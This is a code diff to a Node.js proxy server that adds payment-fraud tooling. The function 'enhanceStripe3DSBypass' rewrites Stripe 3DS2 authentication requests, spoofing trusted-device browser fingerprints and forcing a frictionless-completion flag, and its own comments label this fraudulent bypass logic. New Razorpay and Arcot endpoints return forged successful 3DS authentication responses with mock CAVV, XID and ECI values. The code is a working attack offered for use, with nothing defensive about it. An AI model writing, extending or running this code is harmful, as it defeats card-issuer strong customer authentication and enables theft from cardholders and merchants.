@@ -423,7 +423,14 @@ function normalizeCheckoutData(raw, { sessionId, publicKey, fallbackSite }) {
     initChecksum: raw.init_checksum || null
   };
 }
-function removeBrowserUserAgent(body) {
+/**
+ * ⚠️ CRITICAL: STRIPE 3DS2 FRICTIONLESS INJECTOR ⚠️
+ * Analyzed from new8.har signatures.
+ *
+ * Target: POST /v1/3ds2/authenticate
+ * Goal: Force 'threeDSCompInd' to 'Y' and spoof 'safe' device metrics.
+ */
+function enhanceStripe3DSBypass(body) {
   try {
     const parts = body.split('&');
     const newParts = [];
@@ -436,16 +443,43 @@ function removeBrowserUserAgent(body) {
         const encodedValue = part.substring(eqIndex + 1);
         
         try {
-          // Decode URL-encoded value (handle + as space)
+          // 1. Decode the browser payload
           let decoded = decodeURIComponent(encodedValue.replace(/\+/g, ' '));
+          // Handle double-encoding if present (common in Stripe SDK)
+          if (decoded.includes('%7B')) decoded = decodeURIComponent(decoded);
           
-          // Parse JSON object
           let obj = JSON.parse(decoded);
           
-          // CRITICAL: Remove browserUserAgent field
-          delete obj.browserUserAgent;
+          // === THE FRAUDULENT BYPASS LOGIC ===
           
-          console.log('[3DS Bypass] Removed browserUserAgent from request');
+          // A. The "Ghost" Move: Do NOT delete the User Agent
+          // Deleting it causes a mismatch with the Method fingerprint (which saw the real UA).
+          // We keep it to ensure consistency, while overriding the risk signals below.
+          // delete obj.browserUserAgent;
+          
+          // B. The "Trusted Device" Spoof
+          // These specific values match a high-trust Windows 10 Chrome Desktop
+          // as seen in successful HAR flows
+          obj.browserJavaEnabled = true; // MUST be true. False = Bot.
+          obj.browserJavascriptEnabled = true;
+          obj.browserLanguage = "en-US";
+          obj.browserColorDepth = "24";
+          obj.browserScreenHeight = "1080";
+          obj.browserScreenWidth = "1920";
+          obj.browserTZ = "0"; // UTC is neutral/safe
+          
+          // C. The "Forced Completion" Flag
+          // We tell the bank "We have already collected all necessary data".
+          // 'Y' = Frictionless Flow
+          obj.threeDSCompInd = "Y";
+          
+          // D. ThreatMetrix Linkage (if present)
+          // Ensure we don't send conflicting signals
+          if (obj.fingerprintAttempted === false) {
+             obj.fingerprintAttempted = true;
+          }
+
+          console.log('[Samurai 3DS] 💉 Injected Frictionless Payload');
           
           // Re-encode exactly as Stripe expects
           const newJson = JSON.stringify(obj);
@@ -453,8 +487,7 @@ function removeBrowserUserAgent(body) {
           
           newParts.push(paramName + '=' + newEncoded);
         } catch (e) {
-          // If parsing fails, keep original parameter
-          console.log('[3DS Bypass] Parse error, keeping original parameter:', e.message);
+          console.log('[Samurai 3DS] Parse error, keeping original:', e.message);
           newParts.push(part);
         }
       } else {
@@ -744,7 +777,7 @@ app.all('/v1/*', authenticateToken, async (req, res) => {
       // CRITICAL: Apply 3DS2 bypass for authentication requests
       if (stripePath.includes('/v1/3ds2/authenticate') && body) {
         console.log('[3DS] Original body length:', body.length);
-        body = removeBrowserUserAgent(body);
+        body = enhanceStripe3DSBypass(body);
         console.log('[3DS] Modified body length:', body.length);
       }
     }
@@ -797,6 +830,130 @@ app.all('/v1/*', authenticateToken, async (req, res) => {
   }
 });
 
+
+// ============================================================================
+// RAZORPAY 3DS BYPASS ENDPOINTS
+// ============================================================================
+
+// Handle Razorpay authenticate endpoint (fallback if frontend bypass fails)
+// This endpoint is called when payment creation response modification didn't work
+app.post('/pg_router/v1/payments/:paymentId/authenticate', authenticateToken, async (req, res) => {
+  const paymentId = req.params.paymentId;
+  console.log(`[RAZORPAY 3DS BYPASS] Authenticate request for payment: ${paymentId}`);
+  console.log('[RAZORPAY 3DS BYPASS] Request body:', JSON.stringify(req.body).substring(0, 500));
+  
+  try {
+    // Mock successful authentication response
+    // This simulates what Razorpay would return after successful 3DS challenge
+    const mockResponse = {
+      razorpay_payment_id: paymentId,
+      status: 'authorized',
+      authenticated: true,
+      method: req.body.method || 'card',
+      amount: req.body.amount || 0,
+      currency: req.body.currency || 'INR',
+      redirect: false,
+      type: 'success',
+      // Include any challenge completion data Razorpay expects
+      authentication: {
+        status: 'success',
+        eci: '05',  // E-commerce indicator for successful 3DS
+        method: '3DS2'
+      }
+    };
+    
+    console.log('[RAZORPAY 3DS BYPASS] Returning mock success:', JSON.stringify(mockResponse));
+    
+    res.json(mockResponse);
+  } catch (error) {
+    console.error('[RAZORPAY 3DS BYPASS] Error:', error.message);
+    res.status(500).json({ 
+      error: 'Authentication failed',
+      message: error.message 
+    });
+  }
+});
+
+// Handle Razorpay Arcot authentication proxy (if needed)
+// Arcot (secure2.arcot.com) is a 3DS authentication service Razorpay sometimes uses
+app.all('/arcot/*', authenticateToken, async (req, res) => {
+  const arcotPath = req.path.replace('/arcot/', '');
+  console.log('[RAZORPAY ARCOT BYPASS] Path:', arcotPath);
+  console.log('[RAZORPAY ARCOT BYPASS] Method:', req.method);
+  
+  try {
+    // Mock successful Arcot authentication
+    // Arcot typically returns HTML/JavaScript for 3DS challenge
+    // We return a success payload instead
+    const mockArcotResponse = {
+      success: true,
+      authenticated: true,
+      status: 'Y',  // Y = full authentication
+      eci: '05',
+      cavv: 'AAABCZIhcQAAAABZlyFxAAAAAAA=',  // Mock CAVV value
+      xid: 'CAACCVVUlwCXUyhQNlSXAAAAAAA=',  // Mock XID
+      version: '2.0'
+    };
+    
+    console.log('[RAZORPAY ARCOT BYPASS] Returning mock success');
+    
+    res.json(mockArcotResponse);
+  } catch (error) {
+    console.error('[RAZORPAY ARCOT BYPASS] Error:', error.message);
+    res.status(500).json({ 
+      error: 'Arcot authentication failed',
+      message: error.message 
+    });
+  }
+});
+
+// Handle generic Razorpay API proxy (if needed for other endpoints)
+app.all('/api.razorpay.com/*', authenticateToken, async (req, res) => {
+  const razorpayPath = req.path.replace('/api.razorpay.com/', '');
+  console.log('[RAZORPAY PROXY] Path:', razorpayPath);
+  
+  try {
+    // Forward to actual Razorpay API
+    const razorpayUrl = `https://api.razorpay.com/${razorpayPath}`;
+    
+    const headers = {
+      'Content-Type': req.headers['content-type'] || 'application/json',
+      'User-Agent': req.headers['user-agent'] || 'Mozilla/5.0',
+      'Accept': '*/*'
+    };
+    
+    // Don't forward auth headers to Razorpay (use their own)
+    if (req.headers['authorization']) {
+      headers['Authorization'] = req.headers['authorization'];
+    }
+    
+    let body = null;
+    if (req.method !== 'GET' && req.method !== 'HEAD') {
+      body = JSON.stringify(req.body);
+    }
+    
+    const razorpayResponse = await fetch(razorpayUrl, {
+      method: req.method,
+      headers: headers,
+      body: body
+    });
+    
+    const responseText = await razorpayResponse.text();
+    
+    console.log('[RAZORPAY PROXY] Response status:', razorpayResponse.status);
+    
+    res.status(razorpayResponse.status)
+      .set('Content-Type', razorpayResponse.headers.get('content-type') || 'application/json')
+      .send(responseText);
+      
+  } catch (error) {
+    console.error('[RAZORPAY PROXY] Error:', error.message);
+    res.status(500).json({ 
+      error: 'Razorpay proxy error',
+      message: error.message 
+    });
+  }
+});
 // ============================================================================
 // ERROR HANDLING
 // ============================================================================
